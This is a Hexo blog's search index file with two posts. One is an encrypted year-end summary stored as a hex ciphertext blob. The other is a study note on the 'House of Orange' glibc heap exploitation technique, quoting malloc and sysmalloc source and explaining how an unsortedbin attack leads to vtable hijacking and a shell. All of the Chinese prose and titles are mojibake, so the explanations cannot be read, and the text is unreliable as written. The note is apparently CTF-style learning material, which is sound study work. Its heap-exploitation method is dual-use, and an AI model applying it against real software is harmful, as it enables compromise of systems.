<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2024å¹´åº¦æ€»ç»“</title>
    <url>/2025/01/26/2024%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="æŠ±æ­‰, è¿™ä¸ªå¯†ç çœ‹ç€ä¸å¤ªå¯¹, è¯·å†è¯•è¯•." data-whm="æŠ±æ­‰, è¿™ä¸ªæ–‡ç« ä¸èƒ½è¢«æ ¡éªŒ, ä¸è¿‡æ‚¨è¿˜æ˜¯èƒ½çœ‹çœ‹è§£å¯†åçš„å†…å®¹.">
  <script id="hbeData" type="hbeData" data-hmacdigest="78d3f35f3c3115dd9206142e175aebe0061fa9bc03fdf31b9a527e0e0c9bd40d">1dda5ab2390e0939d2ef7ca01defc37b29ed6e7d5315b6631e3ce758cb5227aba4e29bb271125c331feaf436a85eabd369f01571a8d538076f3272f9b5052e02387cf667080b4d8bc9b5316e77f7cb99cb0a6592f10472c441346fc2c0d8e49abb9cf9839f268c31a967bdad4af1f48b469edee45ecab9456497b8f095fcebc8f66ca6437135cda5539703fafc144bb617a5751d678199134756d27885416adeb6ba9072ea3fe90eb0b62f357930b764566559d88f3098f2181bafbbc5be561700169963ea1f0d09928f57f44423aa12696d3ed2b4ba001691ee5dbea85c8e3f5cdf2baf6c6a3583e44888d0e2488d6e209565c8d0c4ee1716c7bed0d0c16653b495285e6bd21f0a43923e0a89c427804989efbd8e80d6d01ac9c6fd3d394067b521fd4c3fa96d74dba44b0edef83fc4a2e208983c9e707ce6f1a4f16841e6c915b4d2dcdb271ce6597874d7cd4790a0cc3e8eba2cf94b4c14c06db451ce778299d232645a606c736d1d0b53dd11927688dcac8b36927b4d00c69db55cf8d64033887f3c40f1ad9cf6cbb1ab67c897186b5aed53ff6f7597dd120cdaa2d9c6f1ee56eb293e2978056c8234e8d298fb048ffa77be164512afd39d80d3da583c7462fcaffe13da471923a53860599ad8ae6824409e6903257763d1cbcf74befe4716f4b8cd55a8d050f724fd770bfb56eb4a6f0ad9d021177fac3bfcf548148fb89e4d82be4cb0ccaf3823c90208c0f44fe295c857019f355828fa02158bc05dbd5127fb97a8951d9f4aa4d9dc5eef5ff65dbea9c6a3aa804a13d453f59ba018fd810982413048b40c7bead50931978edfea620376920dd112a2a01afed1d3046b9e59d014451124ba0a100b191453d2263bb712d495ec73fbf5ba877fdaf4a9b4fffcc61887a0bd3d4510947ab874d5eb66e09291cd1a47e6413d2c35c5dd28f6148befe22462b84e53bc8794b45c7686eb372a089eb0ab9ece29bc075b410f769d94865134f97f05d876c36b0872ee8b5208094526db393a1840d638b2d831f06639f24daf8dccec00729800e8461159c2568fa6c385075acae765ac61387a7975f13193633157a6351829a3fee829e9490212fc2d06cba5912e8e9a894b634ec1ccd2e131bf8b59b1ac513390f3af624ed766c8558c4104ac6ade149a606268e3b7b178252961f85e4c0388393e05260546b54bd5fda26d123ce682a07abd3d605fcc30c5d7a1e06c7c64827c21d76b8a113c20ec4fdc3b7f07761ff69b7c55a127dcfbfe5c57e555e4e491c37a3a5dec6fa0845af554f31f1b74d2ad976c9a5c12bddc5f4148ca70e399e77a36054261d32cf4763140e40e15612fcae7e8587768a8260ed293499630630227b5c02d4c48321e4dca1e24808b015f215e765ac6a8a99cd0f14991efa350c955d9eec84b863ee2ec701b2cb9105c54ebdc746177775d4c679892b142d56e87947091a65a96b16bd457739d5d7b5722406eb2b37352afd7fa7452100f856b1cce4cfa11dff31db46ec0748d60ee5fb08c75de0821c92e69d275eaf02a511d0599f8caaa34a3458b475a75874b1cb6994f666d7b5b37e4113d59cd1e9caf765fb32fd5d3b0861d7ad27c79c80ed147cc98aff16e206d9daef58ff6202f345c594f74d3e6302cccff90d08d22b12967be775f2f2e80b7fd6117b80624792892c90f4d9b9fd70fd463e523800580e0a061d7972cc5fccc12442942fbb53d59cf4d823fba225e2ed6f3f5b3efaa821078cba172ec2f494b1974cb5f1b9f9860b6c317fcd421e966c634b92420c576e98e987aaaa81b3586fe0a80ccfd75ec86d46d3c11cd32d8f3503465bbe2dd8ff851337eb599b31349c8f004148cbd912c851cdffa3f28d670114fdf00bea1f5ec1295b489f55f528d323cbe2e58f291af0f914d576e2fc04c388af8111e054c37137971c6decf233c288648da26cbfd6a7e6041d48a9390f8063d849618bd44c7c0e37a84a9cfdea1cd23318f18ba4f4591df4ec6bd0ecda5b199223c66ce7e9dffda00926f677b7189e022ab53e999d80bb247393f7bb90a1285a490b7632b34feb15214263e2be9f54f373e98f49bb6fcd75654814e6a3c75de9554fb0e972e6f06b3d8924cdefca77d854037addf9f2614d3642993f8bedc3d20ea062307220e11f4145fb01c27ca2b89b3c0c4fba94399d44f8fd5f5b700d5174fa0bc6fc50c6f76a70d5ea836f796fcef120b6d0bccccc43b2baa6a636c44b6a87df134d852d25f41c0ff5e81b7a4d178e6e2a1c498e4a04e7e557782bdc043ff7d8feabbc3fa5e80ee6bb0a67c6900e449ffb02adbe1ef5533b0c6e0ba111881b4fd02f48feb2cf5d658cf12cf944c07d63906e6248a97775a6b1af8220ec619c4247ef5496a40485d463bbdff3415dd256122e23c10467ea1d6c0c53f96dfda102837d1b71498c66815114ca3630fe7eec8310f5c6ccb43cad30a07d2276935c5d0ce6d670cded90224e6ae133df45d07f803d2eac781c1abf7684a80f09c582f68455f39c47da93acaf3aa977dcb01c3962beb9e8e09ab2d143a3861a501c6d6d4d3d8304725a12a844debaa39895be489fee9f516facc13d2832223acc64ea162ee59d523fdbd3346d30f739c6095f60e11e2b1ea8a15a0bdd4ad155028826bb0eff3737b8c57570124d68c33ec9dc8115ce4824b436d58feb8fd0dcfa77da32bd03cf5d77da07c9ab23f5b6b8abf0ee8fd9b55a311e9e4c2eac241edac30122c2e5d49c23b9bdd2e4bd8c948d87e4f4f9823a6b45467b3c9132523462b07dd10eb690a2528993f7807fb2842bde6306cb3e4272fd12848589abefa29a4355da8ea7e2e71f1674d5c030ecb63d91cc14f31e0ff7e3f763213518f8a31f0c6bd44f239a3eaa52828ee5d2f0e34d12f775828897c8cd9d36977bcfa3730be8593bc55331ab925d000232eaea3aa8d25eac079b072af173fe3aaadf51be34142cf70daedb7ce60d51b1e0519cd922b9d905726bca1d2823e7b96f429858c34e85098024b3e863f32ec9fda5fecf72726b5cfc6effdfc2497781708576159f6ff6d786067614a52528b924b6322ca9f8a7d24a72fb99a872f66b34550fcae53ebdc2e9e6ef0874ef9759fd45ffdafc33d0025f0d6d5676998d90710b7c6f1daccfaf1c9c0fee241d11b5bf460dbca64b9106848a6a7b5d8af90e464f667c89263a5786affcf453a7b25d6230645fe9c732bc76902ada4b69237bf59b8e9ed0b17fced3ae9eae597656027cc086b67c878973601a1d736795ff412680d609ee04d74ba4443fe48d3a7ff15551dcc668b261365c9d87e24542e0ec5f9027a09f19373ed820b3a2a02203ec31c5229c124ace7aa1b9f64a4e1ef22d1f1048adb6029abdf54471f48493b504b79df1d43fd24f5c61257573df9ed9032cf25edf543ce6fb23922d9295e66abab1f2cc72d537f3902abe932781d50c0abf9cb1c6ef0a80e33e15919b3a85f089cd4c58a3cca06a7bf2d74b060f17dc5a109f73416b239bb73e993baa8f207bdc3ca303dc3ac79b897e92d9437f35076d84b7a9cb2e7f5cb878fbecdd122fd89b436d39c0db67ac492407e08d818a3ddee2452ae76dc430c2534a602bababea35d2584fc5d2d6d69723960dda838533430ebc33e733b275363a4da0772ddd8f6ef87119d503a2aad06b57de93f5e349bde176c195b372ed82685b17813b8ce18c174e04b8fc11d2c8c6c08c78e8c3e3b789dbacf463ae6fa388198d1b6879a7d188f2c09f734c185edeb5f25b815bbb4872e2a33a3ba37d4dabc256d0eedc69e352721763b883f1f176b69e4b61af966fe1b772b6ff686e4881f3a3bda1672121d828b98ddcb003ce917ea9704750d5a2cdb7976a1451f026c6aae804e91af3f3b5220145a253df388f77f47d1776dfb0b6612c4bba7b2f4a5487563c8f01134037cda921c95172c439de11d70d1e0a04304a11bee68eb396934aad12614eabe4f57791e2f9c59814b60bfb76eedacf04f3db83427f059a56d8a56a8d83f88069343b96f341df1fcdeadfb0cac98ed9d1716f93ff75afc3733f89bce6e360a7bbd586c285188c2054b03ec4b59c85ebe7fa639f54d8e93d5be72f6aa02dc2a4a406475db006f0b19a5b58556219485ad48f741be042607b580f74f85560b9af14aee690d94e76f6e8d7ae611e02ce0d226a5ad35239a4bac5b9f647f3f8d93d9719a4e20750a3069b98c34a423b6b9e4ecc4a71476f55f08696c03dce689b569b7cc1ff499042d510441f889b455dd9ec1eff412b9e061626b5d5b418cb669f3094fb5616e4d2763bc0b733b5e7c3a1161a740f1f261892df28dac4713bc9bafe7be65a9c206ada2b820ada6b1c66b4968e2a98ec967840c1d96e3d665555f0f20b36860654a06e1c067bdcaf71a0b2ed8173b1857020f3bd01d95132a8317a41cb89f464d02d9cfaea1534b3b9b37a53d1e2e943833a8e682e1f5c8bb8d31659c01cb13597f127997abe37fe3617cb1db8c2625741b83cec7c5cd05319fff18fcbd3602ed434c8208d72d7564239d6e9894d8aa5437e6ca309509609e35326a50ae6ccbd9a2936c5b7cf8eb209df6980115468b6cf415be284467e95c3183d4059b01b536887ebe52cc78618f5069a062ac6cc7f9593773973e28a7bf26637e79c372ee3194e8c1a6b0359d78f8d0fb649f1d5495c71fc3b4d22a0c14ee11163aa339ddc5614bf4f0b751a0fbe225a3ac3a4d2c952cfddec351da868b49e09bae36f185116062a933b88b501de2423dfefd4498d9b130a9476b34d0e144b9b64ec145aabadea1f17ca332d09dfb0bd04c2e40d3e667d86f612b9241853a98dfe335aaa7071389a99bd6a70e80645650076f78acbd4dd0f90f9d752dde22a9be174daa57157002d16bab3435b2f1e69dd0dc4d125586f6c37cd6c98bdd576b2cf706d239b7a2ba1b61c4cdffd505af326055417847d51fd599f2ab58219ef1b2f8e16f0fef71df612820a919364bfacff0e6cbf91344dd72fc4e8e18e9565e28f0bb37caf3492890ee3db8eb92cbafd209b0310824564fabe523b19d47213d22e79e20f0ae652c63ef4105d4fbdef642c57b9fa655a9ba4f94e463290fbcd3a375072c1e65b3344112e71696827134bb6a6ecd0cddb6177d93ee42975f0857123c7a42db9a6fec82879389b3adaead368a8355e0c9475ae9c1e8e4b214d141082eaa95027adc32494b163873ea9b3a75e557081fb371e031cfc98999ab581e3bd18b24e8061e997a7bc79f44b8cda31a58355cff208b51cafe3c904ff454f8ee4f1be24d01b99c2c0018de3b96751490b32d050e9e6933304ee86e43e313613a8a06b26484cc2fbf780674aa6ee9b30f1050202e91eba37050766b930c0771a78e4a95a8623345da67ba4be3f61b3a1bfd56a4cf22d070e180a6b7a4d49e1cafd39a9d1d76ad1e62d3f55864759654011e361571ab701a79e24fb9372b567f3118dbeba39ac3ec66e4d570c60e4685e873574d19cf29881cf60d97de5dcfd6092a2fac49e8da63859d189f17219bf1bd10fbbe8110457c460c1ec1ae6216463210516839cea88d99df9f4a453f84bbb9bbbc4c07a7c9e29f2705d11c41f2ca7bb0e5b9a1213694bc518207dfce1c374126ae747d348e530772f731a6b7659983671a350618d8cdb18b7683188bd26486bc052350eb904e8ce076288ffb8563b6d5cf803d839df08bf3bb2f3ab3c23b4d43ba5f49a37d5f800064524ab17293167a476934c118788113cae5181c12a231087ba4c094d3fab8c28a27746e2c9fd06c96cd3be763690d84e7c49b081cd394bdd2616153699d086b095e825ef05de2adfdc225e047aff0780887a02fb94e936ebb503b8042a5c18d2fd49aa4cb33baf1a96ab185b436834f032a5465680c292c12f43094976d00e39658be761ff0219b69baf27d782d4c195e556ba14f72dae52d14b5776016fe3ea39ce2ede9e30eeebf9ac0fb3824d22c5002c28e1104911954bef232dd74aab6b4a4428b514cd92f1db032cc89f2c7880e888d475169558c12eb200da0c8b4b59bd087ecb02a27affc04374f1b9f24f32b55bac3838142058eb95889d4286fbd058553d084c68fd62615fb6b34b8d1929f469fd7d61e9cebbe9806772d4aa9a67b81a9d7a379a457f00e788a5f14e570e5537342ba6864dd84e0665ea29bdd37e528684039baef701f1ef85ecfa1430f7203f852d0a9a792e4d2afaabaa3602f4c98f50efd8cbf17505ecfe1866621513eae812d4b829a497a1319db35084ee902cdf34bd4b8c45f76ede4a80b7ffc4d5faf8a4669f5d2d0da96863f5b93caaa1091fe8ced5ae09563220559c10eed1ca1ac1aed22282ad844de846c610eda0f9580622928257433851d4f0cb148a9fb868fb73b91646f4160588d7ef8148f58f6f5a03725a768be6a6e5a3eba96f4bb060539ee489de3da45ae98a72321502cda0e7792b523691d59316c1fa49fbb9eabf6e876c08d371f7355139355491366835a5927c69d6ac2777e0603ae078e863a818e0a13cc6f10143cc9d99bb88856f23da258bdeb343b87a4616c99ccbffba8bcd775ed181bd4e3748ebe6f5ece162e808d4404525dab4794c44dab0e3ac7bc40216ad33d6950a6f5c67f7998527156f63189b73ef2c0d7227a732a7fb87f5329630fe4fcdb9b23cb3bcf41093798b33be092d7ef22e7e38f9cc22379d6e7ee58dfac352da3a53bfa28304d6311ab1528ebd1cbeae72c81d7ead2148dfae73083f710af681b26f81b0253a6c0510a1979b6fc7e1cf73af49ee7ceef7c37ab83a96ac839fb76d4bc817f7f609dbe46ebc52cde93515fbad48c4505692b86240659226933e5078faabfc128faaed042d398b12e7610986417ad93823400c707ed79c3808b986ce31113e9b8d926ab21c34f547abd826b5deafc356305ec40c080a0eeaa4b5600813e3dba69af36c66e6491b95b30f5ed753f847dbe066ec84c45dba54d946dad5f25d1ba0068d12618c05a78a194aab6802a1d81ff5a7657baf61bcce228359cca80d7d8598041e3ec23049a9ae93dff661fb86af6a4a128d18727ce948ceae78ad3a38ad55c12b337ed56db3e6405008323eab2f29060da93ec239c42dc54caf577cd81ce2de2fd4da77c1f256b1eafd57f3936177ddd59889f30053379ff111898f0cfe30a91a90ca7ae909c468036388b45b71a5a100b0bac6781610f630e66b969f628a0e00d96f6c885286508a736b94b5efae1b3e8305d749f21369b5d81b6ab0d585d558ef39396c466ddc3e5ebea17f6e76ace34542e97e4e1921afca4ebee764c1e0ed116168f9557189dfe06523e88ac06aa0cbc29c196ab2b960e3253ce1737a1522ede5aa9bece92db9ce6c0174b3717083797d4d3b9b190fdda87a701d7c604c526f64031a0f8e2c45324a8734cd7ec50e7fbc282d690e113f8de9f4acdabe4a7082b912cb52848b8c4cb3d79e6d9b5d8afaa9b58341f498208a19b73c9c42b6249a88e2d13436d6f290f2d7ad16225e049bd9d0e2beaa5bf129d5973b77d0c09a3d2e1b4d88ddc4ac68bfe20f4fd337e4ffd56cf1748fdbf89ffa67d007f708f305580560a92cd68b4c6b92c875a9d397380702548330bcbf9bcaed32eba64af0f6eca399870e1b1a321d6412abf735064ab333bf6e54f4b2c9badadd2ccca7e2dae4719d16963d80370fb2c3ef659e18b79a553464b81f93b700c624e5d5d21d85db25fbb4610ea347c5d7b88320c04ed4938cc6f6c32e36dd93665321ae6dccdb199655ea99bcfed4f5261d51170dcb0b44bc762118e4adb963d479d18f5cb4a42a167eced6364542eeda91d2d5fcf347cd5660842fb667284741dd58f9dd92e4ca19522e699d76984cf663b379744b0d1dd40af0b51fafaa755099e0d55eddcbe5a9d26744ac9d475192aa5e94147f8a1c5ffc7e2446bb2eb84e1d2f0dc30c28c7867d4607b606e56a3e5dfb4d67ba6406d76c63ef917f3696ba8951c5c614b534c5bc4ffd4fb8ae2</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">mick0960 access only!</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
  </entry>
  <entry>
    <title>Houseç³»åˆ—å­¦ä¹ </title>
    <url>/2024/12/21/House%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1>House of Orange</h1>
<p>ä¸»è¦æ˜¯å¯¹ä¹‹å‰æ‰€å­¦ä¹ çš„å†…å®¹è¿›è¡Œç»†èŠ‚è¡¥å……</p>
<h2 id="æ¦‚è¿°">æ¦‚è¿°</h2>
<p>House of orangeæ˜¯ä¸€ç§é’ˆå¯¹ä½ç‰ˆæœ¬å †é¢˜æ— freeå‡½æ•°æ¥è¿›è¡ŒIOæµæ”»å‡»çš„æ‰‹æ³•ã€‚å…¶å¤§è‡´æ€è·¯ä¸ºåˆ©ç”¨unsortedbin_attackåŠ«æŒ_IO_list_allæŒ‡é’ˆï¼Œç„¶ååŠ«æŒ_IO_FILE_plusçš„vtableæ¥è¿›è¡Œgetshell</p>
<h2 id="å‰ç½®çŸ¥è¯†â€”â€”Unsortedbin-attack">å‰ç½®çŸ¥è¯†â€”â€”Unsortedbin attack</h2>
<p>Unsortedbinä¸ºä¸€ä¸ªåŒå‘é“¾è¡¨ï¼Œå…¶å†…çš„å †é‡‡ç”¨FIFOè¿›è¡Œç®¡ç†è¿™é‡Œç›´æ¥åˆ†æä¸€ä¸‹<code>__int_malloc</code>ä¸­å¯¹unsortedbinè¿›è¡Œæ“ä½œçš„ç›¸å…³æºç </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (;; )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">int</span> iters = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">          <span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">            malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                             chunk2mem (victim), av);</span><br><span class="line">          size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/*</span></span><br><span class="line"><span class="comment">             If a small request, try to use last remainder if it is the</span></span><br><span class="line"><span class="comment">             only chunk in unsorted bin.  This helps promote locality for</span></span><br><span class="line"><span class="comment">             runs of consecutive small requests. This is the only</span></span><br><span class="line"><span class="comment">             exception to best-fit, and applies only when there is</span></span><br><span class="line"><span class="comment">             no exact fit for a small chunk.</span></span><br><span class="line"><span class="comment">           */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;</span><br><span class="line">              bck == unsorted_chunks (av) &amp;&amp;</span><br><span class="line">              victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">              (<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt; (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line">            &#123;</span><br><span class="line">              ...</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* remove from unsorted list */</span></span><br><span class="line">          unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line">          &#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>åœ¨fastbin,smallbin,largebinä¸­éƒ½æ— æ³•exact fitåï¼Œå°±è¿›å…¥äº†è¿™ä¸ªå¤§å¾ªç¯åœ¨è¿™ä¸ªå¤§å¾ªç¯ä¸­ï¼Œé¦–å…ˆå¾ªç¯æ£€æŸ¥unsortedbinä¸­æ˜¯å¦æœ‰å †å—å¦‚æœæœ‰çš„è¯ï¼Œå…ˆè®¾ç½®<code>bck = victim-&gt;bk</code>ç„¶åæ£€æŸ¥<code>victim</code>å¤§å°æ˜¯å¦åˆæ³•æ¥ç€æ£€æŸ¥æ‰€ç”³è¯·çš„<code>nb(normalized byte)</code>ï¼š</p>
<ol>
<li class="lvl-3">æ˜¯å¦å±äºsmallbinçš„å¤§å°</li>
<li class="lvl-3">å½“å‰victimæ˜¯å¦ä¸ºunsortedbinçš„æœ€åä¸€ä¸ªå †</li>
<li class="lvl-3">å½“å‰å †çš„å¤§å°æ˜¯å¦å¤§äº(ç”¨æˆ·ç”³è¯·çš„å†…å­˜+MINSIZE)<br>
éƒ½æœªé€šè¿‡çš„è¯ï¼Œåˆ™å°†å½“å‰chunkä»unsortedbiné“¾è¡¨ä¸­é‡Šæ”¾æ“ä½œå¦‚ä¸‹:</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av)</span><br></pre></td></tr></table></figure>
<p>æ­£å¸¸çš„åŒå‘é“¾è¡¨è§£é“¾æ“ä½œä½†æ˜¯å¦‚æœå½“unsortedbinä¸­åªæœ‰ä¸€ä¸ªå †å—ï¼Œè€Œè¯¥å †å—çš„bkæŒ‡é’ˆæˆ‘ä»¬å¯ä»¥è¿›è¡Œä¿®æ”¹é‚£ä¹ˆå°±å¯ä»¥åˆ©ç”¨</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bck-&gt;fd = unsorted_chunks (av)</span><br></pre></td></tr></table></figure>
<p>åœ¨ä»»æ„ä½ç½®å†™ä¸Šunsorted_chunks (av)æŒ‡é’ˆ</p>
<h2 id="å‰ç½®çŸ¥è¯†â€”â€”top-chunk">å‰ç½®çŸ¥è¯†â€”â€”top chunk</h2>
<p>å½“ç”¨æˆ·ç”³è¯·çš„å †å—ï¼Œåœ¨å„ä¸ªbinä¸­éƒ½æ— æ³•æ»¡è¶³åï¼Œåˆ™è¿›å…¥use top</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">use_top:</span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         If large enough, split off the chunk bordering the end of memory</span></span><br><span class="line"><span class="comment">         (held in av-&gt;top). Note that this is in accord with the best-fit</span></span><br><span class="line"><span class="comment">         search rule.  In effect, av-&gt;top is treated as larger (and thus</span></span><br><span class="line"><span class="comment">         less well fitting) than any other available chunk since it can</span></span><br><span class="line"><span class="comment">         be extended to be as large as necessary (up to system</span></span><br><span class="line"><span class="comment">         limitations).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         We require that av-&gt;top always exists (i.e., has size &gt;=</span></span><br><span class="line"><span class="comment">         MINSIZE) after initialization, so if it would otherwise be</span></span><br><span class="line"><span class="comment">         exhausted by current request, it is replenished. (The main</span></span><br><span class="line"><span class="comment">         reason for ensuring it exists is that we may need MINSIZE space</span></span><br><span class="line"><span class="comment">         to put in fenceposts in sysmalloc.)</span></span><br><span class="line"><span class="comment">       */</span></span><br></pre></td></tr></table></figure>
<p>åœ¨use topä¸­ï¼Œé¦–å…ˆä¼šåˆ¤æ–­å½“å‰top chunkçš„sizeæ˜¯å¦å¤§äºç”¨æˆ·ç”³è¯·çš„å†…å­˜å¤§å°</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line">        &#123;</span><br><span class="line">          remainder_size = size - nb;</span><br><span class="line">          remainder = chunk_at_offset (victim, nb);</span><br><span class="line">          av-&gt;top = remainder;</span><br><span class="line">          set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                    (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">          set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line">          <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>ä¸æ»¡è¶³åï¼Œåé¢åˆæ¶‰åŠåˆ°å¦ä¸€ä¸ªå°trick</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* When we are using atomic ops to free fast chunks we can get</span></span><br><span class="line"><span class="comment">   here for all block sizes.  */</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">  &#123;</span><br><span class="line">    malloc_consolidate (av);</span><br><span class="line">    <span class="comment">/* restore original bin index */</span></span><br><span class="line">    <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">      idx = smallbin_index (nb);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      idx = largebin_index (nb);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œä¼šæ£€æŸ¥fastbinä¸­æ˜¯å¦æœ‰chunkï¼Œæœ‰çš„è¯åˆ™è¿›è¡Œåˆå¹¶ï¼Œç„¶åå°†åˆå¹¶åçš„å †ï¼Œæ ¹æ®å…¶å¤§å°åˆ†åˆ°ä¸åŒçš„binä¸­åˆ°æœ€åï¼Œæ‰ä¼šåšå‡ºå“åº”ç”¨æˆ·ç”³è¯·å†…å­˜çš„è¯·æ±‚</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="type">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">          <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">            alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œä½¿ç”¨sysmallocè¿›è¡Œç”³è¯·å†…å­˜</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> *</span><br><span class="line"><span class="title function_">sysmalloc</span> <span class="params">(INTERNAL_SIZE_T nb, mstate av)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/* definations */</span></span><br><span class="line">   <span class="keyword">if</span> (av == <span class="literal">NULL</span></span><br><span class="line">      || ((<span class="type">unsigned</span> <span class="type">long</span>) (nb) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (mp_.mmap_threshold)</span><br><span class="line">	  &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max)))</span><br><span class="line">    &#123;</span><br><span class="line">    ....</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>åœ¨sysmallocä¸­ï¼Œé¦–å…ˆä¼šæ£€æŸ¥ç”³è¯·çš„å†…å­˜æ˜¯å¦å¤§äºmmapçš„æœ€å°ç”³è¯·é˜ˆå€¼å³</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#define DEFAULT_MMAP_THRESHOLD_MIN (128 * 1024)</span><br></pre></td></tr></table></figure>
<p>ä½†å¯¹äºhouse of orangeæ¥è¯´ï¼Œå…¶ç”³è¯·çš„å†…å­˜ä¸ä¼šè¶…è¿‡å…¶å€¼</p>
<p><img src="/images/pasted-19.png" alt="upload successful"><br>
åœ¨è·³è¿‡è¿™ä¸ªæ£€æŸ¥åï¼Œå¼€å§‹è¿›å…¥å‡ ä¸ªæ–­è¨€æ£€æŸ¥</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Record incoming configuration of top */</span></span><br><span class="line"></span><br><span class="line">  old_top = av-&gt;top;</span><br><span class="line">  old_size = chunksize (old_top);</span><br><span class="line">  old_end = (<span class="type">char</span> *) (chunk_at_offset (old_top, old_size));</span><br><span class="line"></span><br><span class="line">  brk = snd_brk = (<span class="type">char</span> *) (MORECORE_FAILURE);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If not the first time through, we require old_size to be</span></span><br><span class="line"><span class="comment">     at least MINSIZE and to have prev_inuse set.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">          ((<span class="type">unsigned</span> <span class="type">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">           prev_inuse (old_top) &amp;&amp;</span><br><span class="line">           ((<span class="type">unsigned</span> <span class="type">long</span>) old_end &amp; (pagesize - <span class="number">1</span>)) == <span class="number">0</span>));</span><br><span class="line">  <span class="comment">// old_end = (char *) (chunk_at_offset (old_top, old_size));</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Precondition: not enough current space to satisfy nb request */</span></span><br><span class="line">  assert ((<span class="type">unsigned</span> <span class="type">long</span>) (old_size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE));</span><br></pre></td></tr></table></figure>
<p>å¯¹äºç¬¬ä¸€ä¸ªassert:</p>
<ol>
<li class="lvl-3">
<p>åˆ¤æ–­old_topçš„åœ°å€æ˜¯å¦å’Œåˆšç”Ÿæˆæ—¶ä¸€æ ·</p>
</li>
<li class="lvl-3">
<p>old_top-&gt;sizeæ˜¯å¦ç­‰äº0</p>
</li>
<li class="lvl-3">
<p>old_top-&gt;sizeæ˜¯å¦å¤§äº0x10</p>
</li>
<li class="lvl-3">
<p>old_top-&gt;prev_inuseæ˜¯å¦ç­‰äº1</p>
</li>
<li class="lvl-3">
<p>old_topæ˜¯å¦ä¸ºé¡µå¯¹é½çš„</p>
</li>
</ol>
<h1>House of Pig</h1>
]]></content>
      <categories>
        <category>å­¦ä¹ </category>
      </categories>
      <tags>
